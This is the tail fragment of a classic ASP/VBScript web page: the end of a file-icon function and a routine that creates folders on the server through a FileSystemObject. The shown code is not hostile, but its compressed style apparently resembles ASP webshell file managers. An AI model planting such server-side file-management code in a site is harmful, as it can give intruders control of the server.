"Wingdings>&#255;":Case Else:getFileIcon = "'Wingdings 2'>/":End Select:End Function:Sub createFolder(thePath):Dim i:i = Instr(thePath, "\"):Do While i > 0:If fsoX.FolderExists(Left(thePath, i)) = False Then:fsoX.CreateFolder(Left(thePath, i - 1)):End If:If InStr(Mid(thePath, i + 1), "\") Then:i = i + Instr(Mid(thePath, i + 1), "\"):Else:i = 0:End If:Loop:End Sub%>

</body></html>
